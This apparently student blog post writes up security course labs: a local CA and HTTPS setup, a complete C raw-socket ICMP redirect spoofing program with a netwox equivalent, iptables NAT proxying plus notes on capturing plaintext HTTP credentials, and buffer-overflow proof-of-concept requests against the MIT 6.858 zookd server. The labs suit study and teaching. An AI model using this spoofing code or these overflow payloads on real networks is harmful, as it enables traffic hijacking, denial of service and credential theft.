---
title: 📖信息安全Lab
description: 汽车软件工程课程Lab
author: Johnny
pubDatetime: 2021-12-09T19:00:56Z
featured: false
draft: false
tags:
  - Course Lab
---

> 本篇博客在数据迁移过程中部分图片丢失。

# Lab0-自己创建CA证书

使用[WSL](https://en.wikipedia.org/wiki/Windows_Subsystem_for_Linux)(Windows Subsystem for Linux)配合Nginx和OpenSSL来自己创建CA证书。
WSL系统：[Ubuntu 20.04.3 LTS](https://www.microsoft.com/store/productId/9NBLGGH4MSV6)

## 安装依赖软件

首先更新系统软件

```shell
sudo apt-get update
sudo apt-get upgrade
```

然后安装Nginx，并启动

```shell
sudo apt-get install -y nginx
sudo service nginx start
```

之后在Windows浏览器输入`http:localhost`就可以看到Nginx的默认页面

![安装成功](https://assets.beyh.net/211208-1.png)

然后安装OpenSSL依赖

```shell
sudo apt-get install -y openssl libssl-dev
```

## 创建CA（Certificate authority）证书

下面的命令将会创建RootCA.pem、RootCA.key&RootCA.crt

```shell
openssl req -x509 -nodes -new -sha256 -days 1024 -newkey rsa:2048 -keyout RootCA.key -out RootCA.pem -subj "/C=US/CN=Root-CA"
openssl x509 -outform pem -in RootCA.pem -out RootCA.crt
```

## 创建域名（Localhost）证书

首先创建一个带有所有本地域名的文件domains.ext，这里我们只需要创建localhost的证书，所以只有一行，如果需要添加其他本地域名，可以在后面添加 `DNS.2=domain.local`，依此类推。

```shell
authorityKeyIdentifier=keyid,issuer
basicConstraints=CA:FALSE
keyUsage = digitalSignature, nonRepudiation, keyEncipherment, dataEncipherment
subjectAltName = @alt_names
[alt_names]
DNS.1 = localhost
```

然后生成域名证书。其中C、ST、L、O分别代表国家、省份、城市和名称，后面的参数可以改成自己的。

```shell
openssl req -new -nodes -newkey rsa:2048 -keyout localhost.key -out localhost.csr -subj "/C=US/ST=YourState/L=YourCity/O=Example-Certificates/CN=localhost.local"
openssl x509 -req -sha256 -days 1024 -in localhost.csr -CA RootCA.pem -CAkey RootCA.key -CAcreateserial -extfile domains.ext -out localhost.crt
```

## 在Nginx中配置HTTPS

上面的证书我都放在了`/etc/ssl/`下，直接修改配置文件`/etc/nginx/sites-available/default`即可。

首先备份一下default文件，再进行修改

```shell
cd /etc/nginx/sites-available/
mv default default.bak
vim default
```

其实就是添加了下面两行

`ssl_certificate /etc/ssl/localhost.crt;`
`ssl_certificate_key /etc/ssl/localhost.key;`

修改后的配置文件如下

```nginx
server {
        listen 443 ssl default_server;
        listen [::]:443 ssl default_server;

        ssl_certificate /etc/ssl/localhost.crt;
        ssl_certificate_key /etc/ssl/localhost.key;

        root /var/www/html;

        index index.html index.htm index.nginx-debian.html;

        server_name _;

        location / {
                try_files $uri $uri/ =404;
        }

}
```

保存之后测试一下Nginx配置是否正确，再启动Nginx

```shell
nginx -t #检查Nginx配置
service nginx start #启动Nginx
service nginx status #查看Nginx运行状态
```

## 在浏览器中信任本地CA

我在Windows中使用的是Edge浏览器，需要在Edge的设置->隐私、搜索和服务->安全性->管理证书中，将前文创建的`RootCA.crt`文件导入受信任的根证书颁发机构中，成功导入之后就可以看到自己的证书啦。

![成功导入](https://assets.beyh.net/211208-2.png)

## 测试HTTPS

打开Edge浏览器，输入`https://localhost`，发现已经成功开启HTTPS访问，并且域名左边有一把🔒，说明证书是有效的，至此实验完成。

![](https://assets.beyh.net/211208-3.png)

## 参考链接

1. [How to create an HTTPS certificate for localhost domains (github.com)](https://gist.github.com/cecilemuller/9492b848eb8fe46d462abeb26656c4f8)
2. [How To Create a Self-Signed SSL Cert for Nginx in Ubuntu 18.04 | DigitalOcean](https://www.digitalocean.com/community/tutorials/how-to-create-a-self-signed-ssl-certificate-for-nginx-in-ubuntu-18-04)

# Lab1-ICMP重定向

## 实验背景

TCP/IP协议在设计之初仅考虑了成本和实现功能，并没有过多考虑安全因素。因此TCP/IP协议栈中提供了大量的起关键作用的信息和指令，但是这些信息和指令的执行缺乏认证机制，能够方便地伪造。由于历史原因，这些漏洞一直被保留，最多进行过简单的修补。通过TCP/IP协议栈的安全实验，可以加深TCP/IP协议的具体机制的理解。

## 实验原理

ICMP重定向信息是路由器向主机提供实时的路由信息，当一个主机收到ICMP重定向信息时，它就会根据这个信息来更新自己的路由表。由于缺乏必要的合法性检查，如果一个黑客想要被攻击的主机修改它的路由表，黑客就会发送ICMP重定向信息给被攻击的主机，让该主机按照黑客的要求来修改路由表。

在VMware虚拟环境中（Virtual Box不同），.2是充当网关的默认地址（通过route命令可以查看当前的网关和路由信息）；所以攻击者可以冒充.2发出重定向包，通知受害者修改自己的网关为攻击者指定的gw地址；如果伪造的gw是自身，可以实现中间人攻击或者DOS攻击（没有启动IP转发功能）；如果是随意IP（不能到达或不负责转发），则可以导致DOS攻击。

## 实验环境

启动两台虚拟机，一台作为攻击者，一台作为被攻击者。

## 实验目标

1. 体验ICMP重定向攻击的效果，加深对ICMP协议功能的理解。

2. 练习使用Raw Socket编程，学习构造包括包头部分的数据包。

## 实验步骤

1. 使用netwox体会实验效果，使用netwox 86发送ICMP重定向包。

   攻击者IP地址：`192.168.10.129`

   被攻击者IP地址：`192.168.10.131`

   使用命令

   ```shell
   netwox 86 -g "192.168.10.129" -i "192.168.10.2"
   ```

   此时被攻击的主机无法上网，Ping命令显示Redirect Host。

   <!-- ![Ping](https://bl6pap004files.storage.live.com/y4mlbDymsIsBrgcjZflQAC6d9g5m2moF7tZOnnunR3rltBLhk-r7xgYtV3IfwQ4ETjKxcv6NVcUfHvrR8QOFMxRMbFILdq1SB-0RnmmBTNqE_AGZtWPHgoGhZWtuEWubDqsZCj_ymSu9y21oggSTfkvjZonPdNp8Ca-PDWcKF3FwQ1IggHNOGxzYoTVrvtz0KFA?width=1323&height=692&cropmode=none) -->

   通过WireShark可以抓到ICMP重定向包。

   <!-- ![抓包](https://bl6pap004files.storage.live.com/y4mkSnAnu2Z8kW8RB5lF5yFD6a0k0FMQuM4hcQ2kt9b3dTFv36kJnK_1RWiOgMUdQinumu2YXvLhB-NJOtWOAxMlnXab1EkKZg35AI8nrj9_Jimw_1ru3U-RZ-HHXaqTr_BfQjKVrvXD-JCK24Li-XFhGetGx8dIoU77ORi1VPw6Oj_2iJN3LGvFNSg63wpCPfm?width=866&height=763&cropmode=none) -->

2. 使用Raw Socket实现ICMP重定向，对指定IP的主机实施重定向攻击。

   注意需要开启虚拟机网卡的混杂模式

   ```
   ifconfig ens33 promisc #开启混杂模式
   ifconfig ens33 -promisc #关闭混杂模式
   ```

   ```c
   // main.c
   #include<stdio.h>
   #include<stdlib.h>
   #include<string.h>
   #include<arpa/inet.h>
   #include<sys/socket.h>
   #include<netinet/ip_icmp.h>
   #include<netinet/if_ether.h>
   
   #define BUFFSIZE 1024
   struct sockaddr_in target;
   struct sockaddr_in source;
   
   const unsigned char *my_IP_src = "192.168.10.2";    // 原网关
   const unsigned char *my_IP_dst = "192.168.10.131";  // 攻击对象IP
   const unsigned char *fakeGatway = "192.168.10.129";  // 攻击者IP
   
   // 计算校验和
   unsigned short in_cksum(unsigned short *addr, int len){
       int sum=0;
       unsigned short res=0;
       while( len > 1)  {
           sum += *addr++;
           len -=2;
       }
       if( len == 1) {
           *((unsigned char *)(&res))=*((unsigned char *)addr);
           sum += res;
       }
       sum = (sum >>16) + (sum & 0xffff);
       sum += (sum >>16) ;
       res = ~sum;
       return res;
   }
   
   int main(){
   
       int rawsock;
       char rec_buff[BUFFSIZE]={0};
       int rec_num;
   
       char send_buff[56]={0};
       int sockfd;
       const int on = 1;
   
       // 创建接受 Socket
       rawsock = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
       if(rawsock < 0){
           printf("raw socket error!\n");
           exit(1);
       }
   
       // 创建发送 Socket
       if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW))<0){
           printf("create sockfd error\n");
           exit(-1);
       }
   
       while(1){
           // receive number, receive data in rec_buf
           rec_num = recvfrom(rawsock, rec_buff, BUFFSIZE, 0, NULL, NULL);
           if(rec_num < 0){
               printf("receive error!\n");
               exit(1);
           }
   
           /*
            * 重定向报文: IP(20) + ICMP报文(8+28 ==> (icmp头8+原ip28)) = 56
            * 原ip28: 将收到的需要进行差错报告IP数据报的首部和数据字段的前8个字节提取出来，作为ICMP报文的数据字段
            * 重定向IP头: task-1
            * ICMP报文头: task-2
            * 原IP: task-3
           */
   
           // rec_buff强制转换为ip类型结构体,把ip类型的结构体指针指向rec_buff
           struct ip *ip = (struct ip*)(rec_buff + 14);
           //printf("source ip: %s\n",inet_ntoa(ip->ip_src));
   
           if(strcmp(inet_ntoa(ip->ip_src), my_IP_dst) != 0  ){
               continue;
           }
   
           int head_length = ip->ip_hl * 4;
   
           // task-3: 先把收到的ip报文的前28个字节赋值给sendbuf的后28-56个字节
           for(int i = 0; i < head_length + 8; i++){
               send_buff[28 + i] = rec_buff[14 + i];
           }
   
           // 构造icmp重定向报文的源ip地址
           if(inet_aton(my_IP_src, &source.sin_addr) == 0){
               printf("create source_addr error");
               exit(1);
           }
   
           // 构造icmp重定向报文的目的地址
           if(inet_aton(my_IP_dst, &target.sin_addr) == 0){
               printf("create destination_addr error");
               exit(1);
           }
   
           // task-1: 修改rec_buff的ip报文段的值
           ip->ip_src = source.sin_addr;
           ip->ip_dst = target.sin_addr;
           ip->ip_len = 56;
           ip->ip_id = IP_DF;
           ip->ip_off = 0;
           ip->ip_ttl = 64;
           ip->ip_p = 1;
   
           // 把前20个字节写入sendbuf
           for(int i = 0; i < 20; i++){
               send_buff[i] = rec_buff[14 + i];
           }
   
           // task-2: 把send_buff的20-28字段的icmp报文首部填好(直接使用sendbuf填值)
           struct icmp *icmp = (struct icmp *)(send_buff + 20);
           icmp->icmp_type = ICMP_REDIRECT;
           icmp->icmp_code = ICMP_REDIR_HOST;
           icmp->icmp_cksum = 0;
           icmp->icmp_cksum = in_cksum((unsigned short *)icmp,36);
           // 构造icmp重定向报文的fake gatway
           if(inet_aton(fakeGatway, &icmp->icmp_hun.ih_gwaddr) == 0){
               printf("create destination_addr error");
               exit(1);
           }
   
           // 打印的时候用
           printf("重定向报文的源地址: %s\n", my_IP_src);
           printf("重定向报文的目的地址: %s\n", my_IP_dst);
           printf("重定向报文的假网关: %s\n", fakeGatway);
   
           // send
           sendto(sockfd, &send_buff, 56, 0, (struct sockaddr *)&target, sizeof(target));
       }
   
   }
   ```

运行效果：

<!-- ![运行效果](https://bl6pap004files.storage.live.com/y4mlzg0bESBfeS6OQ-yUDobDUG5GQwmACGOe6aFTOIm3Ke9EyU5rtXMcFACQubS04UIwu1xHEIbrNKhE-JaOiK1AthNQVEoBQjH0Zp-7lE5TQSwqNqjO4uznKx1JdrV8BLBvBYt_wYLUvJEK-lHbTyXBmue9jI3oXp7EFmnyis_oHQON6PKID5T-9aWeFHAmvLC?width=964&height=534&cropmode=none) -->



## 参考链接

[【实现netwox 86的功能】使用raw socket实现icmp重定向攻击 - 简书 (jianshu.com)](https://www.jianshu.com/p/f07c0eb43fae)

[信息安全课程6：ICMP协议安全 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/58662573)

[信息安全课程9：raw socket编程 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/59327439)

# Lab2-iptables设置代理和netfilter实现包过滤

## 实验背景

Linux的防火墙由netfilter和iptables组成。用户空间的iptables制定防火墙规则，内核空间的netfilter实现防火墙功能。netfilter（内核空间）位于Linux内核中的包过滤防火墙功能体系，称为Linux防火墙的“内核态”。iptables(用户空间)位于/sbin/iptables，是用来管理防火墙的命令的工具，为防火墙体系提供过滤规则/策略，决定如何过滤或处理到达防火墙主机的数据包，称为Linux防火墙的“用户态”。

## 实验内容

1. 使用iptables命令实现代理。需要3台虚拟机进行演示。

2. 基于netfilter，对HTTP报文实现包过滤，并窃取HTTP报文的用户名和密码。

## iptables实现反向代理

实验需要三台主机，信息如下：

| 主机                        | IP地址         |
| --------------------------- | -------------- |
| 用户机（请求服务主机）      | 192.168.10.131 |
| 虚拟机A（提供代理服务主机） | 192.168.10.129 |
| 虚拟机B（提供服务主机）     | 192.168.10.1   |

实现反向代理，即需要用代理服务器将用户与内部服务器隔离起来，当用户向内部服务器申请资源时，请求报文的目的IP是代理服务器的IP，到达代理服务器后，在路由选择之前进行目标地址转换，将目的地址转换为内部服务器的地址。同样，在内部服务器回复请求信息时，响应报文到达代理服务器之后，需要在路由选择之后，将源IP地址转换为代理服务器的IP地址。

默认的状态如下，用户机`192.168.10.131`只可以访问虚拟机B`192.168.10.1`上提供的nginx网页服务，但是无法访问虚拟机A`192.168.10.129`。

![默认状态](https://assets.beyh.net/220503-4.png)

首先在代理机开启转发数据包功能，命令如下

```shell
su
cd /proc/sys/net/ipv4   
echo 1 > ip_forward
```

iptables有四张表、五条链如下图所示

![iptables的整体结构](https://assets.beyh.net/220503-1.png)



需要对NAT表的PREROUTING和POSTROUTING进行操作，执行如下命令

```shell
iptables -t nat -A PREROUTING -d 192.168.10.129 -p tcp --dport 80 -j DNAT --to-destination 192.168.10.1:80
iptables -t nat -A POSTROUTING -p tcp -s 192.168.10.131 -j SNAT --to 192.168.10.129
```

命令解释：

- 第一条：路由转发进站时，把目的地址是`192.168.10.129:80`的tcp报文的目的地址改为`192.168.10.1:80`
- 第二条：路由转发出站时，把发往`192.168.10.131`的tcp包的源地址改为`192.168.10.129`

如果不小心配置错误可以通过`sudo iptables -t nat -F`清空所有规则，参考[iptables 查看、恢复默认设置、保存](https://www.jianshu.com/p/66426a8f1bb9)

iptables的命令参数如下：

- **-t ：**指明对那张表进行操作，iptables有五条链四张表，我们需要对nat表进行操作
- **-A：**追加新规则于指定链的尾部，可选的有五条链
- **-d：**指定数据包的目的地址
- **-p：**指定规则的协议，如tcp, udp, icmp等，可以使用all来指定所有协议
- **-s：**指定数据包的源地址
- **-j：**jump to target，指定了当与规则(Rule)匹配时如何处理数据包
- **DNAT/ SNAT：** SNAT改的是源IP，DNAT改的是目的IP
- **--dport：**指定目的端口号或者端口名称，缺省情况下，将匹配所有端口

通过命令`iptables -t nat -L -n --line-numbers`可以查看配置后的NAT表

![修改后的nat表](https://assets.beyh.net/220503-3.png)

可以查看修改后的效果，用户机既可以通过访问虚拟机A`192.168.10.129`来获取实际运行在虚拟机B`192.168.10.1`上的nginx默认网页，也可以直接访问虚拟机B。

![反向代理](https://assets.beyh.net/220503-2.png)

之后执行如下命令，删除刚才应用的规则，以还原系统原来的默认配置。

```shell
iptables -t nat -D PREROUTING 1
iptables -t nat -D POSTROUTING 1
iptables -L -t nat #查看nat配置规则
```

## netfilter实现包过滤

实验需要两台主机，信息如下

| 主机    | IP地址         |
| ------- | -------------- |
| 虚拟机A | 192.168.10.129 |
| 虚拟机B | 192.168.10.131 |

Netfilter在五个点拦截报文，每个拦截点对应iptable的一个chain

1. NF_BR_PRE_ROUTING:     在报文路由前进行对报文的拦截
2. NF_INET_LOCAL_IN:对到本机的报文进行拦截
3. NF_BR_FORWARD:对需要本机进行三层转发的报文进行拦截
4. NF_INET_LOCAL_OUT:对本机生成的报文进行拦截
5. NF_BR_POST_ROUTING:路由后对报文进行拦截

实验要求：

1. 使用wireshark抓包，分析http报文结构。
2. 根据URL过滤报文，使得无法下载.exe后缀的文件。
3. 截取本虚拟机发出的http报文，判断是否有用户名和密码，若有则将其使用printk打印出来。

### wireshark抓包

首先使用wireshark抓包，通过虚拟机访问支持http的网站[Welcome To PKU JudgeOnline (poj.org)](http://poj.org/)，进行登录操作然后抓包，可以看到浏览器发出的POST请求是明文显示的，可以看到登录时输入的用户名和密码。

<!-- ![wireshark抓包](https://bl6pap004files.storage.live.com/y4m5Lqxuf2MGNsT_LqQVK7fallkxt9XhBsQGyEU9O2fZK2MGuaYS7QYKwOv1tkmbepg58dZkgHVmO5qq23iMetJryPay1JveTiKmgF-mfXBdh2-RVmvTqjkI8X3BDlTUcwTuDMaCxQqEzG1_3A6tYJb35dKgCnw5wByr5qdPQbhruudfKA6ag-lUCcJmftWKwyR?width=1105&height=1075&cropmode=none) -->

### 根据URL过滤报文

todo...

### 窃取HTTP报文的用户名和密码

todo...

# Lab3-MIT 6.858: Computer Systems Security

## 实验内容

本次实验分为两个部分：

 第一部分：使用fuzz或者其他任意方式寻找代码中存在的buffoverflow（最少三处），并给出对应的POC。 

第二部分：挑选出任意一处，并利用给出的ShellCode，写出可以RCE的 EXP。

运行服务器

```shell
./clean-env.sh ./zookd-exstack 8080 &
```

运行poc

```shell
./exploit-2.py localhost 8080
```

overflow1

在http_request_header调用了sprintf函数，这是一个不安全的函数，函数有三个参数，envvar、”HTTP_%s"、 buf。这个函数的作用是先将"HTTP__"和buf拼接，然后复制到envvar中，这里buf的最大长度是8192，而envvar长度是512，我们可以将buf溢出到返回地址中，这里buf为http头部的key，我们可以选择将2000个'A'填充在buf中。

```python
def build_exploit1(shellcode):  
    req = b"GET / HTTP/1.0\r\n"
    for i in range (2000):
        req = req + b"A"
    req = req + b": abc.com\r\n"
    req = req + b"\r\n"
    return req
```

overflow2

在http_request_line中调用了url_decode函数，这里传入了参数reqpath和sp1，作用是将sp1处的字符串拷贝到reqpath地址处，但url_decode此处并不做长度的检查。reqpath的长度为4096，而sp1这里最长可以达到8192，因此我们可以考虑将sp1指向的内容设置为5000，这里溢出的内容可以覆盖到返回地址，最终使得程序崩溃。

```python
def build_exploit(shellcode):
    req =   b"GET /"
    for i in range(5000):
        req = req + b"A"
    req = req + b" HTTP/1.0\r\n"
    req = req + b"\r\n"
    return req
```

overflow3

在http_request_header中同样调用了url_decode，这里传入的参数是value和sp，这里value的长度是512，而sp的长度是8192，和上面一样，但这里我们需要修改的内容是http报文头部。

```python
def build_exploit(shellcode):
    req =   b"GET / HTTP/1.0\r\n"
    req = req + b"HOST: "
    for i in range(2000):
        req += b"C"
    req += b"\r\n"
    req += b"\r\n"
    return req
```

checksec

## 参考链接

1. [信息安全课程11：防火墙（iptables/netfilter） - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/59923208)
2. [信息安全课程12：防火墙（netfilter/iptables） - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/61343421)
3. [iptables 从入门到应用 - FrankB - 博客园 (cnblogs.com)](https://www.cnblogs.com/frankb/p/7427944.html)
4. [使用iptables实现反向代理 - 简书 (jianshu.com)](https://www.jianshu.com/p/09200aa50be4)
5. [MIT 6.858: Computer Systems Security 计算机系统安全 实验1 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/258405554)
6. [信息安全 · see you again/ustc_sse_lesson - 码云 - 开源中国 (gitee.com)](https://gitee.com/fragile_xia/ustc_sse_lesson/tree/master/信息安全)
7. [实验三问答 · 语雀 (yuque.com)](https://www.yuque.com/docs/share/d62b73cc-e91f-419a-b06e-2db5e79bc0b3)
